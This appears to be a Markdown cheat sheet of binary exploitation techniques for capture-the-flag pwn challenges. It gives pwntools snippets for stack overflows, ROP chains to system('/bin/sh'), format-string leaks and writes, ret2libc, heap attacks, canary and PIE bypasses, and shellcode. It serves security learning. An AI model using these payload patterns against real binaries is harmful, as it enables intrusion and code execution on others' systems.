# PWN / Binary Exploitation Knowledge

## Stack Buffer Overflow
- Find offset: `cyclic(1000)` -> run -> `cyclic_find(0x...address...)`
- Control RIP: `payload = b"A" * offset + p64(win_addr)`
- Check for `movaps` issue: stack alignment needs 16-byte boundary. Add a `ret` gadget before target.
- NX disabled: use `shellcraft.sh()` or custom shellcode
- Partial RELRO: GOT overwrite possible; Full RELRO: GOT read-only

## Return Oriented Programming (ROP)
- Find gadgets: `ROPgadget --binary ./vuln | grep "pop rdi"`
- Build chain: `pop rdi; ret -> arg1 -> system@plt`
- Use pwntools: `rop = ROP(elf); rop.call(system, [binsh])`
- For x64: first 6 args in rdi, rsi, rdx, rcx, r8, r9
- SROP: `Sigreturn` frame with pwntools `SigreturnFrame()`

## Format String
- Leak stack: `%p.%p.%p.%p.%p.%p` or positional `%6$p`
- Write with `%n`: `%{value}c%{offset}$hn` for 2-byte write
- pwntools: `fmtstr_payload(offset, {target_addr: value})`
- Offset finding: `AAAA%6$p` -> check for `0x41414141`

## ret2libc / ret2system
- Leak GOT entry: `puts(puts@got)` -> `libc_base = leaked - libc.symbols['puts']`
- Find one_gadget constraints: `one_gadget ./libc.so.6`
- system + /bin/sh: `pop_rdi + binsh_addr + system_addr`

## Heap Exploitation
- **tcache poisoning**: overwrite tcache next pointer to arbitrary address
- **fastbin attack**: double-free -> allocate to arbitrary address
- **unsorted bin attack**: write `main_arena` address to arbitrary location
- **house of force**: overwrite top chunk size -> `malloc(-1)` -> arbitrary write
- **Use-After-Free**: access freed chunk -> leak/heap manipulation

## Canary Bypass
- Fork-based: canary is same for all children -> brute-force byte-by-byte
- Information leak: read canary via format string or other leak
- Preserve canary in payload

## PIE Bypass
- Partial overwrite of return address
- Leak code pointer via format string or unsorted bin
- brute-force 4-bit (1/16 chance) for partial overwrite

## Shellcode
- `context.arch = 'amd64'; context.os = 'linux'`
- `asm(shellcraft.sh())` for execve /bin/sh
- `asm(shellcraft.cat('flag.txt'))` for open-read-write
- Alpha-numeric shellcode for restricted inputs

## seccomp / Sandbox
- `seccomp-tools dump ./vuln` to see rules
- If execve blocked: open/read/write ROP chain
- `shellcraft.open('flag.txt')` + `shellcraft.read(fd, buf, len)` + `shellcraft.write(1, buf, len)`

## pwntools Tips
- `p64()`, `u64()` for packing/unpacking
- `elf.got['puts']`, `elf.plt['system']`
- `elf.symbols['main']`, `elf.search(b'/bin/sh').__next__()`
- `libc = ELF('./libc.so.6')`
- `io = remote('host', port)` or `io = process('./vuln')`
- `io.sendline(payload)`, `io.recvuntil(b':')`, `io.interactive()`
